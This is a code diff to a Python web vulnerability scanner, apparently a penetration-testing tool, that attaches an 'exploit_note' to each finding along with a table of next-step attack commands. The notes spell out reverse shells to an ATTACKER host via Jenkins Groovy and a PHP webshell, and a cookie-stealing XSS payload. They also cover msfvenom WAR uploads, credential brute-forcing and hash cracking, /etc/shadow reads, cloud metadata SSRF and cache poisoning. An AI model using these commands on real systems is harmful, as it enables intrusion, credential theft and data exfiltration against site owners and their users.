@@ -22,7 +22,7 @@ from .http import *  # noqa: F401,F403
 from .crawl import *  # noqa: F401,F403
 from .auth import *  # noqa: F401,F403
 
-__all__ = ['_XXE_LINUX', '_XXE_WIN', '_XXE_HIT', '_XXE_PATHS', '_scan_xxe', '_scan_nosql', '_PATHS', '_DANGEROUS_METHODS', '_SESSION_COOKIE', '_security_headers', '_TAKEOVER', '_takeover_service', '_takeover_finding', '_csp_findings', '_cookie_findings', '_prove_put', '_CACHE_HDRS', '_CACHEABLE', '_cacheable', '_scan_cache_poison', '_UPLOAD_DIRS', '_UPLOAD_ENGINES', '_find_upload_forms', '_scan_upload', '_raw_exchange', '_scan_smuggle', '_scan_reflection', '_WP_PLUGINS', '_scan_wordpress', '_check_prototype_pollution', '_check_ldap_injection', '_check_header_injection', '_check_method_override', '_check_admin_panels', '_check_race_condition', '_check_dom_xss', '_check_type_confusion', '_check_rate_limits', '_PASSWD_RE', '_check_null_byte_injection', '_check_bot_detection_bypass']
+__all__ = ['_XXE_LINUX', '_XXE_WIN', '_XXE_HIT', '_XXE_PATHS', '_scan_xxe', '_scan_nosql', '_PATHS', '_PATH_TIERS', '_DANGEROUS_METHODS', '_SESSION_COOKIE', '_security_headers', '_TAKEOVER', '_takeover_service', '_takeover_finding', '_csp_findings', '_cookie_findings', '_prove_put', '_CACHE_HDRS', '_CACHEABLE', '_cacheable', '_scan_cache_poison', '_UPLOAD_DIRS', '_UPLOAD_ENGINES', '_find_upload_forms', '_scan_upload', '_raw_exchange', '_scan_smuggle', '_scan_reflection', '_WP_PLUGINS', '_scan_wordpress', '_check_prototype_pollution', '_check_ldap_injection', '_check_header_injection', '_check_method_override', '_check_admin_panels', '_check_race_condition', '_check_dom_xss', '_check_type_confusion', '_check_rate_limits', '_PASSWD_RE', '_check_null_byte_injection', '_check_bot_detection_bypass']
 
 
 _XXE_LINUX = ('<?xml version="1.0"?>\n'
@@ -62,7 +62,13 @@ def _scan_xxe(ip: str, port: Port, base: str, auth) -> list[Vuln]:
                         "(arbitrary file read; also an SSRF + billion-laughs DoS surface).",
                         "Disable DTDs / external entities in the XML parser "
                         "(FEATURE_SECURE_PROCESSING, disallow-doctype-decl).",
-                        confidence="confirmed")]
+                        confidence="confirmed",
+                        depth_tier="t2",
+                        exploit_note=(
+                            f"curl -X POST -H 'Content-Type: application/xml' "
+                            f"--data-binary @xxe.xml {base}{path} — expect target file "
+                            "contents; pivot to SSRF via "
+                            "'<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">'."))]
     return []
 
 
@@ -95,7 +101,12 @@ def _scan_nosql(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
         return [_mk(ip, port, "web-nosqli", "critical",
                     f"NoSQL injection authentication bypass ({kind})", ["CWE-943", "CWE-287"],
                     detail, "Cast auth inputs to strings; reject operator objects; validate "
-                    "types server-side (schema/whitelist).", confidence="confirmed")]
+                    "types server-side (schema/whitelist).", confidence="confirmed",
+                    depth_tier="t2",
+                    exploit_note=(
+                        f"Reproduce with: curl -c cookies.txt -X POST "
+                        f"-d '{userf}[$ne]=x&{passf}[$ne]=x' {base}{action}; "
+                        "then use the returned session cookie to enumerate/act as any user."))]
 
     # 1) bracket/array operator (Express/PHP query-string parsers -> object).
     for op, val in (("$ne", "recce"), ("$gt", "")):
@@ -220,6 +231,92 @@ _PATHS = [
 
 
 
+# Depth-tier + tester-next-step for each _PATHS emission. Keyed by script_id so a
+# path variant that re-uses a sid (e.g. phpinfo.php + info.php) inherits one entry.
+# t0 = pure fingerprint (info leaked but the surface is just there);
+# t1 = server-side observable behavior confirmed (metadata/config leaked, admin
+#      surface reachable) but no captured secret yet;
+# t2 = a secret / source / dataset actually READ back (proof of the primitive).
+_PATH_TIERS: dict[str, tuple[str, str]] = {
+    "web-git": ("t2",
+        "git-dumper http://TARGET/.git ./loot && cd loot && git log --all -p "
+        "| grep -E 'password|secret|token|api[_-]?key' ; also trufflehog filesystem ."),
+    "web-gitconfig": ("t1",
+        "curl TARGET/.git/config — extract [remote] URL (may embed http://user:pass@host); "
+        "if present, try that cred against the same VCS host."),
+    "web-dotenv": ("t2",
+        "curl TARGET/.env — grab DB_PASSWORD / APP_KEY / API keys; test each captured "
+        "cred against the app, the DB port, and the cloud APIs it names."),
+    "web-svn": ("t1",
+        "wget -m TARGET/.svn/ ; then svn-extractor.pl or svn-git to reconstruct source; "
+        "grep for config.php / settings.py / secrets."),
+    "web-serverstatus": ("t2",
+        "curl TARGET/server-status — enumerate live URIs (query strings often carry "
+        "session/token params); backend IPs behind proxies inform pivot targets."),
+    "web-phpinfo": ("t2",
+        "curl TARGET/phpinfo.php — extract disable_functions, open_basedir, doc_root, "
+        "loaded extensions; feeds LFI-to-RCE (php://filter, session.save_path)."),
+    "web-webconfig": ("t2",
+        "curl TARGET/web.config — extract <connectionStrings>, machineKey, "
+        "AppPool identity; try SQL creds against the DB port; forge __VIEWSTATE with ysoserial.net."),
+    "web-swagger": ("t0",
+        "curl TARGET/swagger.json | jq '.paths|keys[]' — enumerate endpoints; feed into "
+        "ffuf/recce with the extracted operationIds and auth-token requirements."),
+    "web-tomcat-manager": ("t1",
+        "hydra -L users.txt -P passwords.txt -f TARGET -s PORT http-get /manager/html — "
+        "try tomcat/tomcat, admin/admin, tomcat/s3cret. Success => `msfvenom -p "
+        "java/jsp_shell_reverse_tcp LHOST=... > shell.war` + Manager upload = RCE."),
+    "web-wordpress": ("t0",
+        "wpscan --url TARGET --enumerate u,vp,vt — enumerate users then "
+        "`wpscan --url TARGET --passwords rockyou.txt -U admin`."),
+    "web-robots": ("t1",
+        "curl TARGET/robots.txt — each Disallow entry is a paved trail; probe with "
+        "`ffuf -u TARGET/FUZZ -w <(cut -d' ' -f2 robots.txt)`."),
+    "web-dsstore": ("t1",
+        "python3 dsstore-parser.py TARGET/.DS_Store (or dsstoreparser) — dumps filenames "
+        "the developer left behind; then ffuf each name to discover hidden files."),
+    "web-crossdomain": ("t1",
+        "curl TARGET/crossdomain.xml ; craft a hosted attacker Flash SWF that reads "
+        "TARGET contents — legacy Flash clients still honour the wildcard."),
+    "web-metrics": ("t1",
+        "curl TARGET/metrics | grep -E 'http_requests_total|go_info|process_start_time|"
+        "up{' — extract vhosts, backend service names, and internal endpoint paths for pivot."),
+    "web-htpasswd": ("t2",
+        "hashcat -a 0 -m 1600 (apr1) / -m 500 (md5crypt) / -m 1800 (sha512crypt) "
+        "htpasswd.txt rockyou.txt — cracked passwords go straight into the credential store for spray."),
+    "web-serverinfo": ("t2",
+        "curl TARGET/server-info — extract module list, DocumentRoot, vhosts, and the "
+        "full Apache config for the exposed attack surface."),
+    "web-aws": ("t2",
+        "aws configure --profile pwn (paste captured keys); aws sts get-caller-identity ; "
+        "then aws iam get-account-authorization-details / aws s3 ls to enumerate the blast radius."),
+    "web-wpusers": ("t1",
+        "curl TARGET/wp-json/wp/v2/users | jq -r '.[].slug' > users.txt ; "
+        "wpscan --url TARGET --passwords rockyou.txt -U users.txt --max-threads 5."),
+    "web-jenkins-script": ("t2",
+        "RCE: curl -d 'script=println(\"id\".execute().text)' TARGET/scriptText — "
+        "returns the id output as the Jenkins user; upgrade to reverse shell via "
+        "`new ProcessBuilder([\"bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"]).start()`."),
+    "web-keycloak-console": ("t1",
+        "Try defaults: admin/admin, keycloak/keycloak against "
+        "TARGET/auth/admin/master/console/ ; also fetch TARGET/auth/realms/master/.well-known/"
+        "openid-configuration to map endpoints for a token-endpoint brute-force."),
+    "web-grafana-lfi": ("t2",
+        "curl 'TARGET/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini' "
+        "— extract admin_password; then /api/datasources with that cred yields stored DB creds; "
+        "pivot to the DB port with the captured connection strings."),
+    "web-vault-status": ("t0",
+        "curl TARGET/v1/sys/seal-status — record version; test CVE-2020-16250 JWT auth "
+        "bypass on that version; enumerate mounts via /v1/sys/mounts if a token is later obtained."),
+    "web-elastic-open": ("t2",
+        "curl 'TARGET/_search?pretty&size=100' ; curl TARGET/_snapshot/_all — enumerate "
+        "indices then snapshot-restore for full data exfil; look for kibana index for stored dashboards."),
+    "web-kibana": ("t0",
+        "curl TARGET/api/status | jq .version.number — cross-reference to CVE-2019-7609 "
+        "(LFI/RCE via Timelion) and CVE-2018-17246 (prototype-pollution RCE) if version matches."),
+}
+
+
 _DANGEROUS_METHODS = {"PUT", "DELETE", "TRACE", "CONNECT", "PATCH"}
 
 
@@ -259,7 +356,13 @@ def _security_headers(ip: str, port: Port, headers: dict) -> list[Vuln]:
                 "The root response omits: " + "; ".join(missing) + ".",
                 "Set the missing headers: Content-Security-Policy, X-Frame-Options (or CSP "
                 "frame-ancestors), Strict-Transport-Security on TLS, X-Content-Type-Options: "
-                "nosniff, Referrer-Policy, Permissions-Policy.")]
+                "nosniff, Referrer-Policy, Permissions-Policy.",
+                depth_tier="t1",
+                exploit_note=(
+                    f"Confirm: curl -sI {url_for(ip, port)}/ | grep -iE "
+                    "'content-security|x-frame|hsts|nosniff|referrer|permissions'; "
+                    "chain a missing X-Frame-Options with a clickjack iframe PoC, or a missing CSP "
+                    "with a reflected-XSS payload."))]
 
 
 _TAKEOVER = [
@@ -305,7 +408,13 @@ def _takeover_finding(ip: str, port: Port, base: str, host: str, service: str) -
                "attacker can register it and serve arbitrary content on this domain "
                "(phishing, cookie theft, OAuth-redirect abuse).",
                f"Remove the dangling DNS record, or (re)claim the {service} resource it "
-               "points to.", confidence="confirmed")
+               "points to.", confidence="confirmed",
+               depth_tier="t1",
+               exploit_note=(
+                   f"Verify dangling record: dig {host or base} CNAME +short; then "
+                   f"register the target resource at {service} (see EdOverflow can-i-take-over-xyz "
+                   f"for the {service}-specific claim flow) — success = arbitrary content on this "
+                   "domain (cookie theft, OAuth callback abuse)."))
 
 
 
@@ -340,7 +449,12 @@ def _csp_findings(ip: str, port: Port, headers: dict) -> list[Vuln]:
                 "Weak Content-Security-Policy (bypassable)", ["CWE-693"],
                 "The CSP is present but weak: " + "; ".join(weak) + ".",
                 "Drop 'unsafe-inline'/'unsafe-eval' (use nonces/hashes), remove wildcard/"
-                "scheme sources, and set object-src 'none' + base-uri 'self'.")]
+                "scheme sources, and set object-src 'none' + base-uri 'self'.",
+                depth_tier="t1",
+                exploit_note=(
+                    f"Feed the CSP into https://csp-evaluator.withgoogle.com/ to enumerate "
+                    f"bypass sources; test inline-XSS via `<img src=x onerror=alert(1)>` at "
+                    f"{url_for(ip, port)}/ if unsafe-inline present."))]
 
 
 
@@ -368,7 +482,13 @@ def _cookie_findings(ip: str, port: Port, set_cookie_blob: str) -> list[Vuln]:
                 return
             seen.add((name, title))
             out.append(_mk(ip, port, "web-cookie", sev, f"{title}: {name}", cwes,
-                           f"Set-Cookie: {line[:140]}", fix))
+                           f"Set-Cookie: {line[:140]}", fix,
+                           depth_tier="t1",
+                           exploit_note=(
+                               f"Inspect: curl -sI {url_for(ip, port)}/ | grep -i set-cookie — "
+                               f"attribute gap confirmed for '{name}'. Missing HttpOnly = "
+                               "steal via XSS `document.cookie`; missing Secure = MITM on plain "
+                               "HTTP; missing SameSite = classic CSRF/OAuth-callback abuse.")))
 
         if "httponly" not in low:
             add("low", "Cookie without HttpOnly", ["CWE-1004"],
@@ -472,7 +592,12 @@ def _scan_cache_poison(ip: str, port: Port, auth) -> list[Vuln]:
             f"({reason}). The header is not part of the cache key, so a poisoned entry is "
             "served to every subsequent visitor (redirect hijack / stored-XSS delivery).",
             "Include the header in the cache key or strip it at the edge; never reflect "
-            "Host-family headers into responses."))
+            "Host-family headers into responses.",
+            depth_tier="t2",
+            exploit_note=(
+                f"Poison: curl -H '{h}: attacker.tld' {url_for(ip, port)}/ ; then a plain "
+                f"curl {url_for(ip, port)}/ from any second client returns the poisoned entry. "
+                "Also fuzz further unkeyed headers with Burp Param Miner 'Guess headers'.")))
         break                                  # one proof of the class is enough
     return out
 
@@ -541,7 +666,13 @@ def _scan_upload(ip: str, port: Port, base: str, body: str, auth,
         f"'{forms[0]['action']}') is exposed. Re-run `recce web --upload-shell` to actively "
         "test whether a script can be uploaded and executed.",
         "Validate type/extension server-side, store outside the web root, and serve via a "
-        "non-executing handler.", confidence="potential"))
+        "non-executing handler.", confidence="potential",
+        depth_tier="t0",
+        exploit_note=(
+            f"Run: recce web --upload-shell {url_for(ip, port)} — proves RCE with a "
+            "server-computed marker. Manual: `curl -F "
+            f"{forms[0]['file_field']}=@shell.php {url_for(ip, port)}{forms[0]['action']}` "
+            "then GET the file back from likely upload dirs (/uploads/, /files/, /media/).")))
     if not prove:
         return out
     tag = "recceUP" + hashlib.sha1(f"{ip}:{port.portid}".encode()).hexdigest()[:8]
@@ -584,7 +715,13 @@ def _scan_upload(ip: str, port: Port, base: str, body: str, auth,
                         f"SERVER-COMPUTED marker '{marker}' (payload echoed tag + 7*7) - the "
                         f"{engine} was executed, not served as source. Remote code execution.",
                         f"Delete {c}. Validate type server-side, store outside the web root, "
-                        "serve uploads via a non-executing path.", confidence="confirmed"))
+                        "serve uploads via a non-executing path.", confidence="confirmed",
+                        depth_tier="t2",
+                        exploit_note=(
+                            f"Weaponise: upload {engine} webshell payload "
+                            f"(e.g. `<?php system($_GET['c']); ?>`) to {form['action']}, "
+                            f"then curl '{base}{c}?c=id' — RCE as web-server user. "
+                            "Upgrade to reverse shell via `bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'`.")))
                     return out
                 if fn in gb or (tag in gb):        # stored + retrievable, not executed
                     out.append(_mk(ip, port, "web-upload", "medium",
@@ -594,7 +731,13 @@ def _scan_upload(ip: str, port: Port, base: str, body: str, auth,
                         "executing it. With a matching handler (or a different extension) this "
                         "is a webshell foothold.",
                         f"Delete {c}. Enforce an allow-list of types, randomise stored names, "
-                        "and store outside the web root.", confidence="confirmed"))
+                        "and store outside the web root.", confidence="confirmed",
+                        depth_tier="t2",
+                        exploit_note=(
+                            f"Confirm: curl {base}{c} — file served. Rotate extensions "
+                            "(.phtml, .phar, .php7, .asp, .aspx, .cer, .jsp, .jspx, .config, "
+                            "or .htaccess overrides) via the same upload endpoint to reach "
+                            "a handler that executes.")))
                     return out
     return out
 
@@ -666,7 +809,13 @@ def _scan_smuggle(ip: str, port: Port, timeout: float = 6.0) -> list[Vuln]:
             "second request.",
             "Reject requests bearing both Content-Length and Transfer-Encoding; make the "
             "front-end normalise/route on a single, consistent framing.",
-            confidence="potential"))
+            confidence="potential",
+            depth_tier="t1",
+            exploit_note=(
+                f"Confirm and weaponise with James Kettle's smuggler: "
+                f"python3 smuggler.py -u {url_for(ip, port)} --exit-early ; "
+                f"then hand-craft a queue-poison payload in Burp Repeater "
+                f"({name} direction) — expect a cross-user response on the next victim request.")))
         break                                     # one confirmed direction is enough
     return out
 
@@ -693,7 +842,12 @@ def _scan_reflection(ip: str, port: Port, base: str, auth) -> list[Vuln]:
         out.append(_mk(ip, port, "web-reflected", "medium",
                        "Input reflected unencoded (reflected-XSS lead)", ["CWE-79"],
                        f"GET {base}/?rc=…<i> reflected the '<i>' unencoded -> verify for reflected XSS.",
-                       "Context-encode all reflected user input.", confidence="potential"))
+                       "Context-encode all reflected user input.", confidence="potential",
+                       depth_tier="t1",
+                       exploit_note=(
+                           f"Confirm XSS in a browser: {base}/?rc=<script>alert(1)</script> — "
+                           "if the alert fires, weaponise with a cookie-steal payload "
+                           "`<script>fetch('//ATTACKER/?c='+document.cookie)</script>`.")))
     return out
 
 
@@ -718,14 +872,25 @@ def _scan_wordpress(ip: str, port: Port, base: str, body: str, auth) -> list[Vul
         out.append(_mk(ip, port, "web-wp-version", "info",
                        f"WordPress {ver} detected", ["CWE-1104"],
                        f"WordPress core version {ver} (check for known core CVEs; run wpscan).",
-                       "Keep WordPress core current."))
+                       "Keep WordPress core current.",
+                       depth_tier="t0",
+                       exploit_note=(
+                           f"wpscan --url {base} --enumerate p,t,u,cb --api-token YOUR_TOKEN "
+                           f"— cross-reference core {ver} against wpvulndb; feed users into "
+                           "`wpscan --passwords rockyou.txt -U admin`.")))
     # XML-RPC (brute-force / amplification surface).
     x = _fetch(ip, port, "/xmlrpc.php", method="POST", body="<methodCall></methodCall>", auth=auth)
     if x and x[0] in (200, 405) and "xml" in x[1].get("content-type", "").lower():
         out.append(_mk(ip, port, "web-wp-xmlrpc", "low",
                        "WordPress XML-RPC enabled", ["CWE-799"],
                        f"{base}/xmlrpc.php is enabled (password brute-force + pingback amplification).",
-                       "Disable xmlrpc.php if unused."))
+                       "Disable xmlrpc.php if unused.",
+                       depth_tier="t1",
+                       exploit_note=(
+                           f"Brute-force via xmlrpc: wpscan --url {base} --password-attack "
+                           "xmlrpc-multicall -U admin,editor -P rockyou.txt ; also enumerate "
+                           f"methods with `curl -d '<?xml version=\"1.0\"?><methodCall><methodName>"
+                           f"system.listMethods</methodName></methodCall>' {base}/xmlrpc.php`.")))
     # Installed plugins + their version (readme Stable tag).
     for slug in _WP_PLUGINS:
         r = _fetch(ip, port, f"/wp-content/plugins/{slug}/readme.txt", auth=auth)
@@ -736,7 +901,12 @@ def _scan_wordpress(ip: str, port: Port, base: str, body: str, auth) -> list[Vul
                            f"WordPress plugin '{slug}' v{pver} present", ["CWE-1104"],
                            f"{base}/wp-content/plugins/{slug}/ (readme Stable tag {pver}); "
                            "check it against wpscan/searchsploit.",
-                           "Keep plugins current; remove unused ones."))
+                           "Keep plugins current; remove unused ones.",
+                           depth_tier="t0",
+                           exploit_note=(
+                               f"searchsploit {slug} {pver} ; wpscan --url {base} "
+                               f"--plugins-detection aggressive --enumerate vp — expect "
+                               f"CVE mapping for {slug}@{pver} if known-vulnerable.")))
     return out
 
 
@@ -757,7 +927,13 @@ def _check_prototype_pollution(ip: str, port: Port, auth: dict | None) -> list[V
                     "Prototype Pollution via query parameters", ["CWE-1321"],
                     f"Query string parameter reflected prototype chain: {payload}",
                     "Never trust user input for object property assignment; use Object.assign with frozen objects",
-                    confidence="potential")]
+                    confidence="potential",
+                    depth_tier="t2",
+                    exploit_note=(
+                        f"Confirm: curl '{url_for(ip, port)}{payload}' — marker '{marker}' "
+                        "reflected. Escalate: pollute a defaults key the app trusts "
+                        "(`?__proto__[isAdmin]=1`, `?__proto__[shell]=/bin/bash`), and re-check "
+                        "authz-protected endpoints; on Node lodash/merge use ppmap-payloads for RCE gadgets."))]
         except Exception:
             pass
     return []
@@ -779,7 +955,12 @@ def _check_ldap_injection(ip: str, port: Port, auth: dict | None) -> list[Vuln]:
                     "LDAP Injection", ["CWE-90"],
                     f"LDAP filter accepted wildcard/filter operators: {payload}",
                     "Use LDAP escaping; parameterize all filter inputs",
-                    confidence="potential")]
+                    confidence="potential",
+                    depth_tier="t2",
+                    exploit_note=(
+                        f"Confirm and enumerate: curl \"{url_for(ip, port)}/?search=*)(uid=*\" ; "
+                        "for auth-bypass send `admin)(&(objectClass=*` in login username, blank "
+                        "password (or `*)(cn=*))(|(uid=*`). Try %00 truncation to strip trailing filter."))]
         except Exception:
             pass
     return []
@@ -805,7 +986,12 @@ def _check_header_injection(ip: str, port: Port, auth: dict | None) -> list[Vuln
                     f"HTTP Header Injection via {header}", ["CWE-113"],
                     f"Custom header {header} was reflected or processed: {value[:40]}",
                     "Never reflect user input into response headers; use safe header APIs",
-                    confidence="potential")]
+                    confidence="potential",
+                    depth_tier="t2",
+                    exploit_note=(
+                        f"Confirm CRLF: curl -i -H '{header}: test%0d%0aX-Injected: hacked' "
+                        f"{url_for(ip, port)}/ ; look for X-Injected in the response headers. "
+                        "Escalate to response-splitting cache poison or session fixation via Set-Cookie CRLF."))]
         except Exception:
             pass
     return []
@@ -835,7 +1021,12 @@ def _check_method_override(ip: str, port: Port, auth: dict | None) -> list[Vuln]
                     f"HTTP Method Override via {test[0] if len(test) == 2 else test[2].split('=')[0]}", ["CWE-20"],
                     f"Server processed {method or 'alternate'} method via {test[0]}. Can bypass auth/ACLs.",
                     "Never trust HTTP method from headers/params; use only HTTP verb",
-                    confidence="potential")]
+                    confidence="potential",
+                    depth_tier="t1",
+                    exploit_note=(
+                        f"Bypass an ACL: pick a resource that returns 403 to DELETE, then "
+                        f"curl -X POST -H 'X-HTTP-Method-Override: DELETE' "
+                        f"{url_for(ip, port)}/RESOURCE — expect deletion (204/200 instead of 403)."))]
         except Exception:
             pass
     return []
@@ -883,7 +1074,13 @@ def _check_admin_panels(ip: str, port: Port, base: str, auth: dict | None) -> li
                 f"Admin/Management panel discovered at {path}", ["CWE-200"],
                 f"GET {path} -> HTTP {r[0]} {status_desc}. Title: {title}",
                 "Restrict admin panels to internal IPs; require MFA",
-                confidence="confirmed" if r[0] == 200 else "potential"))
+                confidence="confirmed" if r[0] == 200 else "potential",
+                depth_tier="t1",
+                exploit_note=(
+                    f"Try defaults + brute-force: hydra -L users.txt -P rockyou.txt "
+                    f"{ip} -s {port.portid} http-post-form "
+                    f"'{path}:username=^USER^&password=^PASS^:F=invalid' ; "
+                    f"also ffuf -u {url_for(ip, port)}{path}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt.")))
         except Exception:
             pass
     return findings[:3]  # Limit to top 3 to avoid noise
@@ -921,7 +1118,13 @@ def _check_race_condition(ip: str, port: Port, base: str, auth: dict | None) -> 
                 f"Request timing variance {variance:.3f}s on {path} suggests concurrent state mutations. "
                 f"Manual testing needed (concurrent withdrawals, duplicate submissions).",
                 "Use atomic transactions; test concurrent access; implement idempotency",
-                confidence="potential")]
+                confidence="potential",
+                depth_tier="t1",
+                exploit_note=(
+                    "Reproduce with Burp Turbo Intruder single-packet attack "
+                    "(race-single-packet-attack.py; 20-30 parallel requests) or "
+                    f"`nghttp2 --parallel=30 {url_for(ip, port)}{path}` — target "
+                    "double-spend endpoints (withdraw, redeem, apply-coupon)."))]
     return []
 
 
@@ -944,7 +1147,13 @@ def _check_dom_xss(ip: str, port: Port, body: str, auth: dict | None) -> list[Vu
                 f"DOM-based XSS sink detected: {sink.split(chr(92))[0]}", ["CWE-79"],
                 "JavaScript contains dangerous sink pattern. If source is user-controlled, DOM XSS possible.",
                 "Use textContent instead of innerHTML; avoid eval; use Content Security Policy",
-                confidence="potential")]
+                confidence="potential",
+                depth_tier="t0",
+                exploit_note=(
+                    f"Trace source-to-sink in Chrome DevTools (Sources > Event Listener > "
+                    "'Break on subtree modification') while loading "
+                    f"{url_for(ip, port)}/#<img src=x onerror=alert(1)> ; or run "
+                    "DOMinator/DOM Invader (Burp) to auto-map location.hash/window.name -> sink."))]
     return []
 
 
@@ -978,7 +1187,13 @@ def _check_type_confusion(ip: str, port: Port, base: str, auth: dict | None) -> 
                     f"Parameters {p1} and {p2} produced stably-different responses. "
                     f"May indicate type-coercion logic error (0 == false).",
                     "Explicitly check types; use strict equality (=== not ==)",
-                    confidence="potential")]
+                    confidence="potential",
+                    depth_tier="t1",
+                    exploit_note=(
+                        f"Diff: curl -s {url_for(ip, port)}{p1} > /tmp/a; "
+                        f"curl -s {url_for(ip, port)}{p2} > /tmp/b; diff /tmp/a /tmp/b — "
+                        "then rotate the same trick against auth params (admin=false vs admin=0, "
+                        "role=user vs role[]=admin) to look for authorization bypass."))]
         except Exception:
             pass
     return []
@@ -1010,13 +1225,24 @@ def _check_rate_limits(ip: str, port: Port, base: str, auth: dict | None) -> lis
             "No rate limiting detected", ["CWE-770"],
             f"Rapid requests ({rate:.0f} req/sec) not throttled. Enables brute-force, DoS, scraping.",
             "Implement per-IP rate limiting; use CAPTCHA; exponential backoff",
-            confidence="potential"))
+            confidence="potential",
+            depth_tier="t1",
+            exploit_note=(
+                f"Weaponise: hydra -L users.txt -P rockyou.txt {ip} -s {port.portid} "
+                "http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect' "
+                "— no throttling = credential-stuffing surface. Also try OTP brute or "
+                "coupon-code enumeration.")))
     elif 429 in responses:
         findings.append(_mk(ip, port, "web-rate-limit-present", "info",
             "Rate limiting detected (good)", ["CWE-770"],
             f"HTTP 429 received after {responses.index(429)} requests.",
             "Rate limiting is properly implemented.",
-            confidence="confirmed"))
+            confidence="confirmed",
+            depth_tier="t1",
+            exploit_note=(
+                "Test the bypass: rotate X-Forwarded-For to defeat per-IP counters — "
+                f"`for i in {{1..80}}; do curl -H \"X-Forwarded-For: 10.0.0.$i\" "
+                f"{url_for(ip, port)}/; done` — if 429s stop, limits are IP-only.")))
     return findings
 
 
@@ -1043,7 +1269,14 @@ def _check_null_byte_injection(ip: str, port: Port, base: str, auth: dict | None
                     "Null byte injection (file disclosure)", ["CWE-22"],
                     f"Null byte terminator {probe.split('=')[1][:30]}... bypassed extension check",
                     "Validate and canonicalize paths; reject %00; use allow-lists",
-                    confidence="confirmed")]
+                    confidence="confirmed",
+                    depth_tier="t2",
+                    exploit_note=(
+                        f"Read further files: curl '{url_for(ip, port)}"
+                        "/?file=../../etc/shadow%00.txt' ; escalate LFI to RCE via "
+                        "/proc/self/environ (UA injection), PHP wrappers "
+                        "(php://filter/convert.base64-encode/resource=index.php), or "
+                        "session-file inclusion."))]
         except Exception:
             pass
     return []
@@ -1073,7 +1306,13 @@ def _check_bot_detection_bypass(ip: str, port: Port, base: str, auth: dict | Non
                         f"Bot detection possible bypass: {desc}", ["CWE-200"],
                         f"Request with {desc} was not challenged by bot detection (if present).",
                         "Require JavaScript execution; validate headless detection; use CAPTCHA",
-                        confidence="potential"))
+                        confidence="potential",
+                        depth_tier="t1",
+                        exploit_note=(
+                            f"Weaponise scraping / stuffing: curl-impersonate-chrome "
+                            f"{url_for(ip, port)}/ (or selenium-stealth) — expect the "
+                            "same 200 the vanilla-UA probe got. Chain with rate-limit "
+                            "bypass for credential stuffing / signup abuse.")))
         except Exception:
             pass
     return findings[:1]  # Return first hit
